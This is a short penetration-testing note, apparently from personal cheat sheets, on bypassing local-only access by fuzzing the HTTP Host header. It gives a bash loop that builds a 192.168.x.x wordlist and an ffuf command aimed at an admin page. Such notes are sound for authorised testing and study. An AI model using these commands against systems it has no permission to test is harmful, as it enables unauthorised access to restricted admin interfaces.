**Auth Bypass via HOST Headers**
Immagine you have a recource that can be only accessed locally then you could try to fuzz for HOST headers in order to bypass the restriction.

1)Start by creating a wordlist for 192.168.0.0-192.168.255.255 or use the script in the folder:
```
#! /bin/bash
for a in {1..255};do
    for b in {1..255};do
        echo "192.168.$a.$b" >> ips.txt
    done
done
```

2)Use FFUF to fuzz for hosts:
```
ffuf -u http://IP:PORT/admin.php -w ips.txt -H 'Host: FUZZ' -fs XXXX
```
(Here you might need to use -fs since the -fl -fw might still create some false positives)
